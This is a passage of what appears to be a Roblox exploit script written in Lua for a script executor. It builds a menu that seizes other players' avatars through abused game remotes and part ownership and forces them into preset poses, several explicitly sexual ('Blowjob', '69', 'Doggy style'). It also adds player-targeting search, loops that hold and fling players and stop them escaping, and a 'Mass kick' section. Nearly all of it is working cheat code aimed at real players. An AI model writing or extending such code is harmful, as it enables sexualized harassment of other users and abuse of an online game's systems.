				["Right Arm"] = { X = 0.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
				["Left Leg"] = { X = -0.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
				["Right Leg"] = { X = 0.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
			}

			local tbl20 = {
				Torso = { X = 0, Y = 0.1, Z = 0.9, RX = -174, RY = -180, RZ = 0 },
				Head = { X = 0, Y = 1.5, Z = 0, RX = -23, RY = 0, RZ = 0 },
				["Left Arm"] = { X = -1.5, Y = 1.1, Z = -0.5, RX = 129, RY = 27, RZ = -12 },
				["Right Arm"] = { X = 1.5, Y = 1, Z = -0.4, RX = 135, RY = -21, RZ = 10 },
				["Left Leg"] = { X = -0.9, Y = -1.7, Z = -0.3, RX = 46, RY = -19, RZ = -21 },
				["Right Leg"] = { X = 0.9, Y = -1.6, Z = -0.4, RX = 55, RY = 19, RZ = 19 },
			}

			local tbl21 = {
				Torso = { X = 2.7, Y = 0.4, Z = 1.4, RX = -16, RY = 165, RZ = -10 },
				Head = { X = 0, Y = 1.6, Z = 0, RX = -12, RY = 7, RZ = -7 },
				["Left Arm"] = { X = -1.5, Y = 0.7, Z = 0, RX = 75, RY = 1, RZ = -23 },
				["Right Arm"] = { X = 1.2, Y = 0.9, Z = -0.4, RX = 129, RY = 12, RZ = -63 },
				["Left Leg"] = { X = -0.6, Y = -1.9, Z = 0.4, RX = -23, RY = 0, RZ = 0 },
				["Right Leg"] = { X = 0.5, Y = -1.9, Z = 0, RX = 0, RY = -15, RZ = 0 },
			}

			local tbl22 = {
				Torso = { X = 0, Y = -0.5, Z = 1.8, RX = 108, RY = -180, RZ = 0 },
				Head = { X = 0, Y = 1.6, Z = 0.5, RX = 45, RY = 0, RZ = 0 },
				["Left Arm"] = { X = -1, Y = 1.3, Z = -0.5, RX = 128, RY = 0, RZ = -19 },
				["Right Arm"] = { X = 1, Y = 1.3, Z = -0.5, RX = 130, RY = 0, RZ = 19 },
				["Left Leg"] = { X = -0.8, Y = -0.5, Z = -1, RX = 104, RY = 0, RZ = -22 },
				["Right Leg"] = { X = 0.8, Y = -0.5, Z = -1, RX = 104, RY = 0, RZ = 22 },
			}

			local tbl23 = {
				Torso = { X = 0, Y = 0, Z = -1.1, RX = -9, RY = -180, RZ = 0 },
				Head = { X = 0, Y = 1.4, Z = 0, RX = -21, RY = -1, RZ = 13 },
				["Left Arm"] = { X = -1.4, Y = -0.4, Z = -0.6, RX = 19, RY = 0, RZ = 30 },
				["Right Arm"] = { X = 1.4, Y = -0.4, Z = -0.6, RX = 29, RY = 0, RZ = -30 },
				["Left Leg"] = { X = -0.8, Y = -1.9, Z = 0.4, RX = -29, RY = 0, RZ = -16 },
				["Right Leg"] = { X = 0.7, Y = -1.9, Z = 0.4, RX = -33, RY = 0, RZ = 19 },
			}

			local mercuryConfigPath = getgenv().mercury_config_path or "mercury_config"
			local str5 = mercuryConfigPath .. "/Poses.json"

			if not isfolder(mercuryConfigPath) then
				makefolder(mercuryConfigPath)
			end

			tbl6 = {
				Default = tbl15,
				["Head Sit"] = tbl16,
				["kiss me"] = tbl17,
				Blowjob = tbl18,
				Backpack = tbl19,
				["69"] = tbl20,
				["Stand pose 1"] = tbl21,
				["stands behind"] = tbl23,
				["Doggy style"] = tbl22,
			}

			tbl7 = {}
			tbl8 = {}

			fn12 = function()
				local v23, v24 = v17(function()
					writefile(str5, HttpService:JSONEncode(tbl7))
				end)

				if not v23 then
					warn("Failed to save poses: " .. tostring(v24))
				end
			end

			local function fn18()
				if isfile(str5) then
					local v23, v24 = v17(function()
						return HttpService:JSONDecode(readfile(str5))
					end)

					if v23 and type(v24) == "table" then
						tbl7 = v24
					end
				end
			end

			fn13 = function()
				table.clear(tbl8)

				for k, v23 in pairs(tbl6) do
					tbl8[k] = v23
				end

				for k, v23 in pairs(tbl7) do
					tbl8[k] = v23
				end
			end

			fn18()
			fn13()

			fn14 = function()
				local tbl24 = {}

				for k in pairs(tbl8) do
					table.insert(tbl24, k)
				end

				table.sort(tbl24)
				return tbl24
			end

			tbl9 = {}

			for k, v23 in pairs(tbl15) do
				tbl9[k] = {
					X = v23.X,
					Y = v23.Y,
					Z = v23.Z,
					RX = v23.RX,
					RY = v23.RY,
					RZ = v23.RZ,
				}
			end
		end
	end

	do
		local str5
		str5 = "Default"
		local str6
		str6 = "My Pose"
		local v18
		v18 = nil
		local v19
		v19 = nil
		local v20
		v20 = nil
		local antiRunningKickThreads
		antiRunningKickThreads = {}
		local v21
		v21 = nil
		_G.antiRunningKickThreads = antiRunningKickThreads
		local flag7
		flag7 = false
		local flag8
		flag8 = false
		local n25
		n25 = 0
		local n26
		n26 = 3
		local highlight, fn15, v22, tbl10, createDropdown, v23, flag9, fn16, fn17, v24
		local flag10, v25, fn18, fn19, fn20

		do
			local folder = Instance.new("Folder")
			folder.Name = "PoseVisualizer"

			v17(function()
				folder.Parent = game:GetService("CoreGui")
			end)

			if not folder.Parent then
				folder.Parent = lp.PlayerGui
			end

			highlight = Instance.new("Highlight")
			highlight.FillColor = Color3.fromRGB(255, 0, 0)
			highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
			highlight.FillTransparency = 0.5
			highlight.OutlineTransparency = 0.2
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.Parent = folder

			local function createLineHandleAdornment(color3, cFrame)
				local lineHandleAdornment = Instance.new("LineHandleAdornment")
				lineHandleAdornment.Color3 = color3
				lineHandleAdornment.Length = 4
				lineHandleAdornment.Thickness = 5
				lineHandleAdornment.CFrame = cFrame
				lineHandleAdornment.AlwaysOnTop = true
				lineHandleAdornment.ZIndex = 10
				lineHandleAdornment.Parent = folder
				lineHandleAdornment.Visible = false
				return lineHandleAdornment
			end

			local cframe = CFrame.Angles
			local v26 = createLineHandleAdornment(Color3.new(1, 0, 0), cframe(0, 1.5707963267948966, 0))
			local cframe2 = CFrame.Angles
			local v27 = createLineHandleAdornment(Color3.new(0, 1, 0), cframe2(-1.5707963267948966, 0, 0))
			local cframe3 = CFrame.new
			local v28 = createLineHandleAdornment(Color3.new(0, 0, 1), cframe3())

			fn15 = function()
				if flag7 then
					n25 = v16()
				end
			end

			v22 = nil
			tbl10 = {}
			createDropdown = nil
			v23 = nil
			flag9 = false
			local tbl11 = {}

			local function fn21(arg)
				arg = arg and string.lower(arg) or ""
				local tbl12 = {}
				table.clear(tbl11)

				for _, player in pairs(ps:GetPlayers()) do
					if player ~= lp then
						local str7 = player.DisplayName .. " | " .. player.Name

						if arg == "" or string.find(string.lower(str7), arg, 1, true) then
							table.insert(tbl12, str7)
							tbl11[str7] = player
						end
					end
				end

				table.sort(tbl12)
				return tbl12
			end

			fn16 = function(arg)
				local v29 = fn21(arg)
				tbl10 = v29

				if createDropdown then
					createDropdown:Refresh(v29)
				end
			end

			fn17 = function(arg)
				if not arg or arg == "" then
					v22 = nil
					return
				end
				local v29 = tbl11[arg]

				if not v29 then
					v29 = ps:FindFirstChild((arg:match("%|%s*(.+)$") or arg):gsub("^%s*(.-)%s*$", "%1"))
				end

				if v29 then
					v22 = v29
					flag9 = false

					if v23 and v23.SetValue then
						v23:SetValue(false)
					elseif v23 and v23.SetState then
						v23:SetState(false)
					end

					if _G.Selected then
						_G.Selected.kickPlayer = v29
					end
				end
			end

			v24 = nil
			local tbl12 = { Name = "YouDecoy", Character = nil, Parent = nil }
			flag10 = false
			v25 = nil

			fn18 = function()
				local v29 = ws:FindFirstChild(lp.Name .. "SpawnedInToys")
				local youDecoy = v29 and v29:FindFirstChild("YouDecoy")
				local v30

				if not youDecoy then
					local spawnRemote = _G.SpawnRemote

					if not spawnRemote then
						local menuToys = game:GetService("ReplicatedStorage"):FindFirstChild("MenuToys")
						spawnRemote = menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction")
					end

					if not spawnRemote then
						return
					end
					local canSpawnToy = lp:FindFirstChild("CanSpawnToy")

					if canSpawnToy and not canSpawnToy.Value then
						local v31 = v16()

						while not canSpawnToy.Value do
							if not (v16() - v31 > 3) then
								task.wait()
								continue
							end
							break
						end
					end

					local humanoidRootPart = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						return
					end

					task.spawn(function()
						v17(function()
							spawnRemote:InvokeServer("YouDecoy", humanoidRootPart.CFrame * cf(0, 15, 20), v32(0, 0, 0))
						end)
					end)

					local v31 = v16()

					while not youDecoy do
						if not (v16() - v31 > 5) then
							local v33 = ws:FindFirstChild(lp.Name .. "SpawnedInToys")
							youDecoy = v33 and v33:FindFirstChild("YouDecoy")

							if not youDecoy then
								task.wait()
							end

							continue
						end

						break
					end

					v30 = youDecoy
				else
					v30 = youDecoy
				end

				if not v30 then
					return
				end
				v24 = v30
				tbl12.Character = v30
				tbl12.Parent = v30
				fn15()
			end

			local function fn22(arg)
				if not arg then
					return nil
				end

				if typeof(arg) == "Instance" and arg:IsA("Model") then
					return arg
				end
				return arg.Character
			end

			fn19 = function()
				if flag9 and v24 and v24.Parent then
					return tbl12
				end

				if v22 then
					return v22
				end
				return _G.Selected and _G.Selected.kickPlayer
			end

			task.spawn(function()
				while task.wait() do
					local v29 = fn19()
					v29 = v29 and fn22(v29)
					local v30 = v29 and v29:FindFirstChild(selectedLimb)

					if v30 and v30:IsA("BasePart") then
						if flag8 then
							v26.Adornee = v30
							v27.Adornee = v30
							v28.Adornee = v30
							v26.Visible = true
							v27.Visible = true
							v28.Visible = true
						else
							v26.Visible = false
							v27.Visible = false
							v28.Visible = false
						end

						if v16() - n25 <= n26 then
							highlight.Adornee = v30
						else
							highlight.Adornee = nil
						end
					else
						highlight.Adornee = nil
						v26.Visible = false
						v27.Visible = false
						v28.Visible = false
					end
				end
			end)

			local function fn23(arg)
				if not arg then
					return
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("BasePart") then
						local bringBP = descendant:FindFirstChild("BringBP")

						if bringBP then
							bringBP:Destroy()
						end

						for _, v29 in ipairs({ "KickHoldBP", "KickHoldAP", "KickHoldBG", "KickHoldAtt0", "KickHoldBV" }) do
							local v30 = descendant:FindFirstChild(v29)

							if v30 then
								v30:Destroy()
							end
						end
					end
				end
			end

			local function fn24()
				if v20 then
					fn23(v20)

					for _, descendant in ipairs(v20:GetDescendants()) do
						if descendant:IsA("BasePart") then
							v17(function()
								descendant.CanCollide = true
								descendant.CanTouch = true
								descendant.CanQuery = true
							end)
						end
					end
				end

				if v18 and v18.Parent then
					v17(function()
						local bringBP = v18:FindFirstChild("BringBP")

						if bringBP then
							bringBP:Destroy()
						end

						for _, v29 in ipairs({ "KickHoldBP", "KickHoldAP", "KickHoldBG", "KickHoldAtt0" }) do
							local v30 = v18:FindFirstChild(v29)

							if v30 then
								v30:Destroy()
							end
						end

						v18.CanCollide = true
						v18.CanTouch = true
						v18.CanQuery = true
					end)
				end

				if v19 then
					v17(function()
						v19.PlatformStand = false
						v19.Sit = false
						v19.AutoRotate = true
						v19:ChangeState(Enum.HumanoidStateType.GettingUp)
						wait_()
						v19:ChangeState(Enum.HumanoidStateType.Running)
					end)
				end

				local kickHoldAtt1 = workspace.Terrain:FindFirstChild("KickHoldAtt1")

				if kickHoldAtt1 then
					kickHoldAtt1:Destroy()
				end

				v18 = nil
				v19 = nil
				v20 = nil
			end

			local function fn25(arg)
				local v29 = fn22(arg)
				if not v29 then
					return false
				end
				local head = v29:FindFirstChild("Head")
				local torso = v29:FindFirstChild("Torso") or v29:FindFirstChild("UpperTorso")

				if head then
					local partOwner = head:FindFirstChild("PartOwner")
					if partOwner and partOwner:IsA("StringValue") and partOwner.Value == lp.Name then
						return true
					end
				end

				if torso then
					local partOwner = torso:FindFirstChild("PartOwner")
					if partOwner and partOwner:IsA("StringValue") and partOwner.Value == lp.Name then
						return true
					end
				end

				return false
			end

			fn20 = function(arg)
				_G.antiRunningKickEnabled = false

				if v21 then
					v21:Disconnect()
					v21 = nil
				end

				for _, antiRunningKickThread in ipairs(antiRunningKickThreads) do
					if antiRunningKickThread and type(antiRunningKickThread) == "thread" then
						task.cancel(antiRunningKickThread)
					elseif antiRunningKickThread and antiRunningKickThread.Disconnect then
						antiRunningKickThread:Disconnect()
					end
				end

				antiRunningKickThreads = {}
				_G.antiRunningKickThreads = antiRunningKickThreads
				fn24()

				if arg and fn22(arg) then
					local humanoidRootPart = fn22(arg):FindFirstChild("HumanoidRootPart")

					if humanoidRootPart and destroyLine then
						task.spawn(function()
							for i = 1, 5 do
								v17(function()
									destroyLine:FireServer(humanoidRootPart)
								end)

								task.wait()
							end
						end)
					end
				end

				task.spawn(function()
					wait_()

					if not _G.antiRunningKickEnabled then
						fn24()
					end
				end)
			end

			local function fn26(arg)
				if not arg then
					return
				end

				for _, v29 in ipairs(tbl5) do
					local v30 = arg:FindFirstChild(v29)

					if v30 and v30:IsA("BasePart") then
						v17(function()
							v30.CanCollide = false
							v30.CanTouch = false
							v30.CanQuery = false
						end)
					end
				end
			end

			local function fn27(arg)
				if not arg then
					return
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
					end
				end
			end

			local function fn28(arg, arg2)
				local torso = arg:FindFirstChild("Torso") or arg:FindFirstChild("UpperTorso")
				if not torso then
					return
				end
				local cframe4 = CFrame.new(arg2)

				if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
					local lookVector = lp.Character.HumanoidRootPart.CFrame.LookVector
					local v29 = math.atan2(lookVector.X, lookVector.Z)
					cframe4 = CFrame.new(arg2) * CFrame.Angles(0, v29, 0)
				end

				local torso2 = tbl9.Torso
				local cframe5 = CFrame.Angles
				local cFrame = cframe4 * cf(torso2.X, torso2.Y, torso2.Z) * cframe5(math.rad(torso2.RX), math.rad(torso2.RY), math.rad(torso2.RZ))
				torso.CFrame = cFrame
				torso.CanCollide = false
				torso.CanTouch = false
				torso.CanQuery = false

				for k, v29 in pairs(tbl9) do
					if k ~= "Torso" then
						local v30 = arg:FindFirstChild(k)

						if v30 and v30:IsA("BasePart") then
							local cframe6 = CFrame.Angles
							local rad = math.rad
							local rz = v29.RZ
							v30.CFrame = cFrame * cf(v29.X, v29.Y, v29.Z) * cframe6(math.rad(v29.RX), math.rad(v29.RY), rad(rz))
							v30.CanCollide = false
							v30.CanTouch = false
							v30.CanQuery = false
						end
					end
				end

				if v18 then
					v17(function()
						v18.CanCollide = false
						v18.CanTouch = false
						v18.CanQuery = false
					end)
				end
			end

			local function fn29(arg, arg2)
				if not arg or not fn22(arg) then
					return
				end
				arg2 = arg2 and arg2:FindFirstChild("SoundPart")
				local flag11 = false
				local cFrame = nil
				local wait_2 = task.wait

				if v21 then
					v21:Disconnect()
					v21 = nil
				end

				local function fn30(parent, position)
					local bringBP = parent:FindFirstChild("BringBP")

					if not bringBP then
						local bodyPosition = Instance.new("BodyPosition")
						bodyPosition.Name = "BringBP"
						bodyPosition.Parent = parent
						bringBP = bodyPosition
					end

					bringBP.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					bringBP.Position = position
					bringBP.P = 1
					bringBP.D = 1
				end

				table.insert(antiRunningKickThreads, task.spawn(function()
					while _G.antiRunningKickEnabled and arg and arg.Parent do
						local humanoidRootPart = fn22(arg)
						humanoidRootPart = humanoidRootPart and humanoidRootPart:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart and humanoidRootPart.Parent then
							sno:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
						end

						task.wait()
					end
				end))

				if arg2 then
					table.insert(antiRunningKickThreads, task.spawn(function()
						local v29 = v16()

						while _G.antiRunningKickEnabled and arg and arg.Parent do
							local v30 = v16()

							if v30 - v29 >= 0.06 then
								local v31 = fn22(arg)
								local head = v31 and v31:FindFirstChild("Head")

								if head then
									spawn(function()
										arg2.CFrame = head.CFrame
									end)
								end

								v29 = v30
							end

							task.wait()
						end
					end))
				end

				table.insert(antiRunningKickThreads, task.spawn(function()
					while _G.antiRunningKickEnabled and arg and arg.Parent do
						local character = lp.Character

						if not character then
							wait_2()
						else
							local humanoid = character:FindFirstChild("Humanoid")

							if not humanoid or humanoid.Health <= 0 then
								wait_2()
							else
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

								if not humanoidRootPart then
									wait_2()
								else
									local v29 = fn22(arg)
									local humanoid2 = v29 and v29:FindFirstChild("Humanoid")
									local humanoidRootPart2 = v29 and v29:FindFirstChild("HumanoidRootPart")

									if not v29 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart2 then
										if cFrame then
											humanoidRootPart.CFrame = cFrame
											cFrame = nil
										end

										flag11 = false
										fn24()
										wait_2()
									else
										v18 = humanoidRootPart2
										v19 = humanoid2
										v20 = v29
										fn27(v29)
										fn26(v29)

										if arg == tbl12 or fn25(arg) then
											if flag11 then
												flag11 = false

												if cFrame then
													humanoidRootPart.CFrame = cFrame
													cFrame = nil
												end
											end

											local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
											local n27

											if torso then
												n27 = torso.Position + Vector3.new(0, tbl9.Torso.Y, 0)
											else
												n27 = humanoidRootPart.Position + Vector3.new(0, tbl9.Torso.Y + 5, 0)
											end

											fn28(v29, n27)
											fn30(humanoidRootPart2, n27, humanoidRootPart.CFrame.LookVector)
										else
											if (humanoidRootPart2.Position - (flag11 and cFrame and cFrame.Position or humanoidRootPart.Position)).Magnitude > 30 then
												if not flag11 then
													flag11 = true
													cFrame = humanoidRootPart.CFrame
												end

												humanoidRootPart.CFrame = humanoidRootPart2.CFrame * cf(0, -8, 0)
											elseif flag11 then
												flag11 = false

												if cFrame then
													humanoidRootPart.CFrame = cFrame
													cFrame = nil
												end
											end

											fn30(humanoidRootPart2, (flag11 and cFrame and cFrame.Position or humanoidRootPart.Position) + Vector3.zero, humanoidRootPart.CFrame.LookVector)
										end

										wait_2()
									end
								end
							end
						end
					end

					fn24()
				end))
			end

			local function fn30(arg)
				if not arg then
					return
				end

				if not permanentPallet.enabled or not permanentPallet.currentPallet then
					return
				end
				local v29 = v25
				local flag11 = v25

				if v29 then
					flag11 = v29 ~= arg
				end

				if flag11 then
					fn20(v29)
				else
					fn20(arg)
				end

				v25 = arg
				_G.antiRunningKickEnabled = true
				fn29(arg, permanentPallet.currentPallet)
			end

			local function fn31(arg)
				local v29 = fn14()

				if arg and arg.Refresh then
					arg:Refresh(v29, str5)
				end
			end

			local v29 = figureLockBlock:CreateDropdown({
				Name = "Load Preset Pose",
				Items = fn14(),
				Default = "Default",
				Callback = function(arg)
					str5 = arg
					local v29 = tbl8[arg]

					if v29 then
						for k, v30 in pairs(v29) do
							if tbl9[k] then
								tbl9[k].X = v30.X
								tbl9[k].Y = v30.Y
								tbl9[k].Z = v30.Z
								tbl9[k].RX = v30.RX
								tbl9[k].RY = v30.RY
								tbl9[k].RZ = v30.RZ
							end
						end

						fn15()
					end
				end,
			})

			figureLockBlock:CreateInput({
				Name = "New Pose Name",
				Default = "My Pose",
				Placeholder = "Enter pose name...",
				Callback = function(arg)
					str6 = arg
				end,
			})

			figureLockBlock:CreateButton({
				Name = "Save Current Pose Config",
				Callback = function()
					if str6 == "" or str6 == nil then
						return
					end
					local tbl13 = {}

					for k, v30 in pairs(tbl9) do
						tbl13[k] = { X = v30.X, Y = v30.Y, Z = v30.Z, RX = v30.RX, RY = v30.RY, RZ = v30.RZ }
					end

					tbl7[str6] = tbl13
					fn12()
					fn13()
					fn31(v29)
				end,
			})

			figureLockBlock:CreateButton({
				Name = "Delete Selected Pose Config",
				Callback = function()
					if tbl6[str5] then
						return
					end

					if tbl7[str5] then
						tbl7[str5] = nil
						fn12()
						fn13()
						str5 = "Default"

						for k, v30 in pairs(tbl8.Default) do
							if tbl9[k] then
								tbl9[k].X = v30.X
								tbl9[k].Y = v30.Y
								tbl9[k].Z = v30.Z
								tbl9[k].RX = v30.RX
								tbl9[k].RY = v30.RY
								tbl9[k].RZ = v30.RZ
							end
						end

						fn31(v29)
					end
				end,
			})

			local str7 = "Torso"

			figureLockBlock:CreateDropdown({
				Name = "Select Limb",
				Items = { "Torso", "Head", "Left Arm", "Right Arm", "Left Leg", "Right Leg" },
				Default = "Torso",
				Callback = function(arg)
					str7 = arg
					fn15()
				end,
			})

			figureLockBlock:CreateToggle({
				Name = "Show Limb Axes (X,Y,Z)",
				Default = false,
				Callback = function(arg)
					flag8 = arg
				end,
			})

			local flag11 = false

			figureLockBlock:CreateToggle({
				Name = "Mirror Mode (Sync Left/Right)",
				Default = false,
				Callback = function(arg)
					flag11 = arg
				end,
			})

			local function fn32(arg, arg2, y)
				local str8

				if arg == "Left Arm" then
					str8 = "Right Arm"
				elseif arg == "Right Arm" then
					str8 = "Left Arm"
				elseif arg == "Left Leg" then
					str8 = "Right Leg"
				else
					str8 = nil

					if arg == "Right Leg" then
						str8 = "Left Leg"
					end
				end

				if str8 and tbl9[str8] then
					if arg2 == "X" then
						tbl9[str8].X = -y
					elseif arg2 == "Y" then
						tbl9[str8].Y = y
					elseif arg2 == "Z" then
						tbl9[str8].Z = y
					elseif arg2 == "RX" then
						tbl9[str8].RX = y
					elseif arg2 == "RY" then
						tbl9[str8].RY = -y
					elseif arg2 == "RZ" then
						tbl9[str8].RZ = -y
					end

					fn15()
				end
			end

			figureLockBlock:CreateSlider({
				Name = "Pos X (Red Line)",
				Min = -300,
				Max = 300,
				Default = 0,
				Callback = function(arg)
					if tbl9[str7] then
						local x = arg / 10
						tbl9[str7].X = x
						local flag12 = flag11

						if flag11 then
							flag12 = str7 == "Left Arm" or str7 == "Right Arm" or str7 == "Left Leg" or str7 == "Right Leg"
						end

						if flag12 then
							fn32(str7, "X", x)
						end

						fn15()
					end
				end,
			})

			figureLockBlock:CreateSlider({
				Name = "Pos Y (Green Line) - HEIGHT",
				Min = -300,
				Max = 300,
				Default = 40,
				Callback = function(arg)
					if tbl9[str7] then
						local y = arg / 10
						tbl9[str7].Y = y
						local flag12 = flag11

						if flag11 then
							flag12 = str7 == "Left Arm" or str7 == "Right Arm" or str7 == "Left Leg" or str7 == "Right Leg"
						end

						if flag12 then
							fn32(str7, "Y", y)
						end

						fn15()
					end
				end,
			})

			figureLockBlock:CreateSlider({
				Name = "Pos Z (Blue Line)",
				Min = -300,
				Max = 300,
				Default = 0,
				Callback = function(arg)
					if tbl9[str7] then
						local z = arg / 10
						tbl9[str7].Z = z
						local flag12 = flag11

						if flag11 then
							flag12 = str7 == "Left Arm" or str7 == "Right Arm" or str7 == "Left Leg" or str7 == "Right Leg"
						end

						if flag12 then
							fn32(str7, "Z", z)
						end

						fn15()
					end
				end,
			})

			figureLockBlock:CreateSlider({
				Name = "Rot X (Red Axis)",
				Min = -180,
				Max = 180,
				Default = 0,
				Callback = function(rx)
					if tbl9[str7] then
						tbl9[str7].RX = rx
						local flag12 = flag11

						if flag11 then
							flag12 = str7 == "Left Arm" or str7 == "Right Arm" or str7 == "Left Leg" or str7 == "Right Leg"
						end

						if flag12 then
							fn32(str7, "RX", rx)
						end

						fn15()
					end
				end,
			})

			figureLockBlock:CreateSlider({
				Name = "Rot Y (Green Axis)",
				Min = -180,
				Max = 180,
				Default = 0,
				Callback = function(ry)
					if tbl9[str7] then
						tbl9[str7].RY = ry
						local flag12 = flag11

						if flag11 then
							flag12 = str7 == "Left Arm" or str7 == "Right Arm" or str7 == "Left Leg" or str7 == "Right Leg"
						end

						if flag12 then
							fn32(str7, "RY", ry)
						end

						fn15()
					end
				end,
			})

			figureLockBlock:CreateSlider({
				Name = "Rot Z (Blue Axis)",
				Min = -180,
				Max = 180,
				Default = 0,
				Callback = function(rz)
					if tbl9[str7] then
						tbl9[str7].RZ = rz
						local flag12 = flag11

						if flag11 then
							flag12 = str7 == "Left Arm" or str7 == "Right Arm" or str7 == "Left Leg" or str7 == "Right Leg"
						end

						if flag12 then
							fn32(str7, "RZ", rz)
						end

						fn15()
					end
				end,
			})

			figureLockBlock:CreateButton({
				Name = "Reset Pose to Default",
				Callback = function()
					for k, v30 in pairs(tbl8.Default) do
						if tbl9[k] then
							tbl9[k].X = v30.X
							tbl9[k].Y = v30.Y
							tbl9[k].Z = v30.Z
							tbl9[k].RX = v30.RX
							tbl9[k].RY = v30.RY
							tbl9[k].RZ = v30.RZ
						end
					end

					if v29 and v29.Refresh then
						v29:Refresh(fn14(), "Default")
					end

					str5 = "Default"
					fn15()
				end,
			})

			figureLockBlock:CreateInput({
				Name = "Search player",
				Default = "",
				Placeholder = "Type to search...",
				Callback = function(arg)
					fn16(arg)
				end,
			})

			createDropdown = figureLockBlock.CreateDropdown

			createDropdown = createDropdown(figureLockBlock, {
				Name = "Select player",
				Items = tbl10,
				Default = "",
				Callback = function(arg)
					fn17(arg)

					if flag10 then
						fn30(fn19())
					end
				end,
			})

			ps.PlayerAdded:Connect(function()
				task.defer(function()
					fn16("")
				end)
			end)

			ps.PlayerRemoving:Connect(function(player)
				if v22 == player then
					v22 = nil

					if createDropdown then
						createDropdown:SetValue("")
					end

					if flag10 then
						fn30(fn19())
					end
				end

				task.defer(function()
					fn16("")
				end)
			end)

			fn16("")

			v23 = figureLockBlock:CreateToggle({
				Name = "Pose on YouDecoy Clone",
				Default = false,
				Callback = function(arg)
					flag9 = arg

					if arg and v24 == nil then
						fn18()
					end

					if flag10 then
						fn30(fn19())
					end
				end,
			})

			figureLockBlock:CreateToggle({
				Name = "Start Loop [Pose]",
				Default = false,
				Callback = function(arg)
					if arg then
						flag10 = true
						v25 = nil
						fn30(fn19())
					else
						flag10 = false
						fn20(v25 or fn19())
						v25 = nil
					end
				end,
			})
		end

		flag7 = true
		local ps2, lp2, sno2, createLine, destroyLine2, notify, cf2, v33, tspawn, twait

		do
			local miscTab = _G.MiscTab
			ps2 = _G.PS
			lp2 = _G.LP
			sno2 = _G.SNO
			createLine = _G.CreateLine
			destroyLine2 = _G.DestroyLine
			notify = _G.Notify
			cf2 = _G.CF
			v33 = _G.V3
			tspawn = _G.tspawn or task.spawn
			twait = _G.twait or task.wait
			local tcancel = _G.tcancel or task.cancel
			local v26 = miscTab:CreateBlock({ Name = "Mass kick", Side = "Right", ImageID = "13285615784" })
			local flag11 = false
			local flag12 = false
			local n27 = 10
			local n28 = 0.005
			local n29 = 0.01
			local tbl11 = { nil, nil, nil, nil, nil }
			local tbl12 = {}
			local tbl13 = {}
			local tbl14 = {}
			local v27 = nil

			local function fn21(arg)
				if arg then
					arg.Velocity = v33(0, 0, 0)
					arg.AssemblyLinearVelocity = v33(0, 0, 0)
					arg.RotVelocity = v33(0, 0, 0)
					arg.AssemblyAngularVelocity = v33(0, 0, 0)
				end
			end

			local function fn22(arg)
				if not arg or not arg.Character then
					return false
				end

				for _, descendant in ipairs(arg.Character:GetDescendants()) do
					if descendant.Name == "PartOwner" and descendant:IsA("StringValue") and descendant.Value == lp2.Name then
						return true
					end
				end

				return false
			end

			local function fn23(arg)
				if not arg then
					return
				end
				local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local kickHoldGyro = humanoidRootPart:FindFirstChild("KickHoldGyro")

				if not kickHoldGyro then
					kickHoldGyro = Instance.new("BodyGyro")
					kickHoldGyro.Name = "KickHoldGyro"
					kickHoldGyro.MaxTorque = v33(math.huge, math.huge, math.huge)
					kickHoldGyro.Parent = humanoidRootPart
				end

				kickHoldGyro.P = 50000
				kickHoldGyro.D = 100
				kickHoldGyro.CFrame = CFrame.new(humanoidRootPart.Position, humanoidRootPart.Position + v33(1, 0, 0))
			end

			local function fn24(arg, arg2)
				for _, v28 in ipairs({ "Head", "Torso", "UpperTorso", "LowerTorso", "Left Arm", "Right Arm", "Left Leg", "Right Leg" }) do
					local v29 = arg:FindFirstChild(v28)

					if v29 then
						if arg2 then
							fn21(v29)
							v29.CanCollide = false
							v29.CanTouch = false
						else
							v29.CanCollide = true
							v29.CanTouch = true
						end
					end
				end
			end

			local function fn25(parent, position, arg)
				local kickHoldBP = parent:FindFirstChild("KickHoldBP")

				if not kickHoldBP then
					kickHoldBP = Instance.new("BodyPosition")
					kickHoldBP.Name = "KickHoldBP"
					kickHoldBP.Parent = parent
				end

				kickHoldBP.MaxForce = v33(math.huge, math.huge, math.huge)
				kickHoldBP.P = 50000
				kickHoldBP.D = 100
				kickHoldBP.Position = position
				local kickHoldBG = parent:FindFirstChild("KickHoldBG")

				if not kickHoldBG then
					kickHoldBG = Instance.new("BodyGyro")
					kickHoldBG.Name = "KickHoldBG"
					kickHoldBG.MaxTorque = v33(math.huge, math.huge, math.huge)
					kickHoldBG.Parent = parent
				end

				kickHoldBG.P = 50000
				kickHoldBG.D = 100
				kickHoldBG.CFrame = CFrame.new(parent.Position, parent.Position + arg)
				local kickHoldAP = parent:FindFirstChild("KickHoldAP")

				if not kickHoldAP then
					local kickHoldAtt0 = parent:FindFirstChild("KickHoldAtt0")

					if not kickHoldAtt0 then
						kickHoldAtt0 = Instance.new("Attachment")
						kickHoldAtt0.Name = "KickHoldAtt0"
						kickHoldAtt0.Parent = parent
					end

					local kickHoldAtt1Mass = workspace.Terrain:FindFirstChild("KickHoldAtt1_Mass")

					if not kickHoldAtt1Mass then
						kickHoldAtt1Mass = Instance.new("Attachment")
						kickHoldAtt1Mass.Name = "KickHoldAtt1_Mass"
						kickHoldAtt1Mass.Parent = workspace.Terrain
					end

					kickHoldAP = Instance.new("AlignPosition")
					kickHoldAP.Name = "KickHoldAP"
					kickHoldAP.Attachment0 = kickHoldAtt0
					kickHoldAP.Attachment1 = kickHoldAtt1Mass
					kickHoldAP.Mode = Enum.PositionAlignmentMode.TwoAttachment
					kickHoldAP.Parent = parent
				end

				kickHoldAP.MaxForce = math.huge
